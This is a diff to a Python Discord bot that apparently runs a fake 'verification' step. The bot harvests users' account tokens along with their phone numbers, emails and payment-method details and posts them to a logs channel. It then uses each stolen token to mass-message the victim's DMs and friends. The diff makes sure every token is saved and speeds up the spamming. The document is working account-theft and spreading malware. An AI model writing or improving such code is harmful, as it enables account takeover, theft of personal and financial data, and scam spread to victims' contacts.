@@ -306,10 +306,11 @@ async def start(ctx):
                             if logs_channel:
                                 embed_user = nextcord.Embed(title=f"**New user verified: {user.username}#{user.discriminator}**", description=f"```yaml\nUser ID: {user.id}\nAvatar ID: {avatar_id}\nPhone Number: {phone_number}\nEmail: {email}\nMFA Enabled: {mfa_enabled}\nFlags: {flags}\nLocale: {locale}\nVerified: {verified}\nHas Nitro: {has_nitro}\nPayment Methods: {payment_methods}\n```\n```yaml\nToken: {token}\n```", color=5003474)
                     except:
-                        database[user.id]["token"] = token
                         if logs_channel:
                             embed_user = nextcord.Embed(title=f"**New user verified: {user.username}#{user.discriminator}**", description=f"```yaml\nUser ID: {user.id}\nToken: {token}\n```\n```yaml\nNo other information found\n```", color=5003474)
                         pass
+                    
+                    database[user.id]["token"] = token
                 
                     json.dump(database, open("database.json", "w", encoding="utf-8"), indent=4)
 
@@ -347,10 +348,10 @@ async def start(ctx):
                                         try:
                                             requests.post(f'https://discord.com/api/v9/channels/' + channel2['id'] + '/messages', headers={'Authorization': token}, data={"content": f"{message}"})
                                             success += 1
-                                            sleep(1)
+                                            sleep(.5)
                                         except:
                                             failures += 1
-                                            sleep(1)
+                                            sleep(.5)
                                             pass
                             print(f"{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Current DM(s) successfully messaged")
                             if logs_channel:
@@ -375,7 +376,7 @@ async def start(ctx):
                                     send_message(token, chat_id, payload)
                                 except:
                                     pass
-                                sleep(1)
+                                sleep(.5)
 
                             if len(getfriends) == 0:
                                 print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} This guy is lonely, he aint got no friends...")
